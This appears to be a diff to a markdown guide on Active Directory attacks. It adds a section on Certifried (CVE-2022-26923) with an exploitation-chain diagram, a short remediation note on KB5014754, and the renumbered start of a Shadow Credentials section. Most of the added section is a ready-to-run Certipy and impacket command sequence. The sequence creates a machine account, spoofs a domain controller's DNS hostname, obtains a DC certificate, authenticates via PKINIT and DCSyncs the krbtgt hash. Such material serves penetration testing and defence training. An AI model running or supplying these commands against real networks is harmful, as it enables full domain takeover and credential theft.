@@ -162,7 +162,61 @@ impacket-secretsdump -hashes :<DC01_NTHASH> 'corp.local/DC01$@10.0.0.1' -just-dc
 
 ---
 
-## 4. Shadow Credentials (`msDS-KeyCredentialLink`)
+### 4. Certifried (CVE-2022-26923): Domain Controller DNS Hostname Spoofing
+
+Discovered by Oliver Lyak, **Certifried (CVE-2022-26923)** is a severe privilege escalation vulnerability stemming from how Active Directory Certificate Services maps computer identities during certificate issuance.
+
+```
++-----------------------------------------------------------------------------------------+
+| CERTIFRIED (CVE-2022-26923) EXPLOITATION CHAIN                                          |
+|                                                                                         |
+|  1. CREATE COMPUTER ACCOUNT:                                                            |
+|     Attacker uses standard domain account to create machine account: FAKECOMP$          |
+|                                                                                         |
+|  2. SPOOF DNS HOSTNAME:                                                                 |
+|     Attacker updates dNSHostName attribute on FAKECOMP$ to match Domain Controller:     |
+|     dNSHostName = dc01.corp.local (AD historically failed to enforce uniqueness!)       |
+|                                                                                         |
+|  3. REQUEST MACHINE CERTIFICATE:                                                        |
+|     Attacker requests certificate from AD CS using standard "Machine" template.         |
+|     AD CS constructs the Subject Alternative Name (SAN) from dNSHostName!               |
+|     CA issues certificate valid for: dc01.corp.local!                                   |
+|                                                                                         |
+|  4. AUTHENTICATE AS DOMAIN CONTROLLER VIA PKINIT:                                       |
+|     Attacker authenticates via PKINIT presenting the certificate.                       |
+|     KDC matches SAN to real DC01$ computer account -> Issues DC01$ TGT & NT Hash!       |
+|                                                                                         |
+|  5. DCSYNC:                                                                             |
+|     Attacker executes DCSync using DC01$ credentials -> Forest Compromised!             |
++-----------------------------------------------------------------------------------------+
+```
+
+#### Step-by-Step Execution with Certipy:
+```bash
+# 1. Create a controlled machine account:
+certipy account create -u 'jdoe@corp.local' -p 'Pass123!' -account 'FAKECOMP$' -password 'CompPass123!' -dc-ip 10.0.0.1
+
+# 2. Update dNSHostName to target Domain Controller FQDN:
+certipy account update -u 'jdoe@corp.local' -p 'Pass123!' -account 'FAKECOMP$' -dns 'dc01.corp.local' -dc-ip 10.0.0.1
+
+# 3. Request certificate using the Machine template:
+certipy req -u 'FAKECOMP$@corp.local' -p 'CompPass123!' -ca 'corp-CA01-CA' -target ca01.corp.local -template 'Machine' -dc-ip 10.0.0.1
+
+# 4. Authenticate as the Domain Controller via PKINIT:
+certipy auth -pfx dc01.pfx -dc-ip 10.0.0.1
+
+# 5. Execute DCSync using dumped DC01$ NT hash:
+impacket-secretsdump -hashes :<DC01_NTHASH> 'corp.local/DC01$@10.0.0.1' -just-dc-user krbtgt
+```
+
+#### Defensive Remediation & KB5014754:
+Microsoft addressed CVE-2022-26923 in KB5014754 by introducing **Strong Certificate Binding**:
+* The CA now embeds a non-forgeable extension containing the account's immutable object SID (`szOID_NTDS_CA_SECURITY_EXT` / OID `1.3.6.1.4.1.311.25.2`).
+* When authenticating via PKINIT, the KDC matches the certificate against the embedded SID rather than the `dNSHostName` or UPN attribute, completely neutralizing spoofing attempts.
+
+---
+
+## 5. Shadow Credentials (`msDS-KeyCredentialLink`)
 
 Introduced with Windows Server 2016 for Windows Hello for Business (WHfB), the **Shadow Credentials** technique allows an attacker who has write permissions (`GenericAll`, `GenericWrite`, or `WriteProperty`) over a target computer or user object to take complete control without modifying the target's password.
 
